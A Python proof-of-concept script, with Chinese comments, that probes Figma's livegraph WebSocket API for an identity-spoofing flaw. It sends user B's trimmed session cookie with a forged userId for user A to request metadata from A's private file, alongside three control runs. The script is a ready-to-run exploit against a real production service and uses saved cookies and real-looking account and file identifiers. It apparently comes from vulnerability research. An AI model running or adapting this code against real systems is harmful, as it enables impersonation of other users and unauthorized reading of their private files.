# -*- coding: utf-8 -*-
"""决定性实验: 纯净B + claim A 后查 A 私有文件工具元数据
若返回 A 数据 → auth userId 伪造=真实身份切换 (严重越权, B 可伪装 A)
对照: 纯净B+claimB 查同文件 (无权限应拒绝) / 纯净A+claimA (owner 正常)
"""
import sys, json, asyncio, io, uuid, urllib.parse
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
TARGET = "5Gs4PaTz11Hlk2sqVnidBG"   # A 的私有文件
PUBLIC = "bv2nMIdFf4u3dESGail4sm"   # 公开对照
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def make_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split('; '):
        if '=' in p:
            k, v = p.split('=', 1)
            parts[k] = v
    authn_raw = parts.get('__Host-figma.authn', '')
    authn = json.loads(urllib.parse.unquote(authn_raw))
    authn = {k: v for k, v in authn.items() if k == keep_uid}
    parts['__Host-figma.authn'] = urllib.parse.quote(json.dumps(authn, separators=(',', ':')))
    return '; '.join(f'{k}={v}' for k, v in parts.items())

rawB = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
rawA = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
PURE_B = make_pure(rawB, B_UID)
PURE_A = make_pure(rawA, A_UID)

def lg_url(client_url, claim_uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={claim_uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{client_url}"
            f"&connectionType=initial&reconnect=0")

def auth(uid, client_url):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": uid, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                     "clientUrl": f"https://www.figma.com/file/{client_url}"},
            "clientRequestedVersion": 2}

async def probe(label, cookie, claim_uid, file_key, view_name, args, wait=10):
    client_url = file_key
    try:
        async with websockets.connect(lg_url(client_url, claim_uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth(claim_uid, client_url)))
            authed = None
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "auth" in msg:
                    authed = json.loads(msg)
                    break
            au = authed.get('userId') if authed else None
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view_name,
                                      "viewHash": "00000000000000000000000000000000",
                                      "loadType": "initial", "args": args}))
            frames = []
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}"); return
    print(f"[{label}] authUserId={au} 帧数={len(frames)}")
    for f in frames:
        s = f[:400].replace('\n', ' ')
        print(f"    🖼 {s}")
        if 'errors' in f and 'view' in f:
            try:
                d = json.loads(f)
                for e in d.get('errors', []):
                    print(f"    ⚠️ view 错误: {json.dumps(e)[:200]}")
            except Exception:
                pass

async def main():
    FAKE = str(uuid.uuid4())
    print("=" * 60)
    print("实验 A: 纯净B + claimA → 查 A 私有文件 (核心!)")
    await probe("纯净B claimA 私有", PURE_B, A_UID, TARGET, "FileCustomToolsMetadataView",
                {"fileKey": TARGET, "toolIds": [FAKE]})
    print("=" * 60)
    print("实验 B: 纯净B + claimB → 查 A 私有文件 (无权限对照)")
    await probe("纯净B claimB 私有", PURE_B, B_UID, TARGET, "FileCustomToolsMetadataView",
                {"fileKey": TARGET, "toolIds": [FAKE]})
    print("=" * 60)
    print("实验 C: 纯净A + claimA → 查 A 私有文件 (owner 对照)")
    await probe("纯净A claimA 私有", PURE_A, A_UID, TARGET, "FileCustomToolsMetadataView",
                {"fileKey": TARGET, "toolIds": [FAKE]})
    print("=" * 60)
    print("实验 D: 纯净B + claimA → 查公开文件 (数据可用性对照)")
    await probe("纯净B claimA 公开", PURE_B, A_UID, PUBLIC, "FileCustomToolsMetadataView",
                {"fileKey": PUBLIC, "toolIds": [FAKE]})

asyncio.run(main())
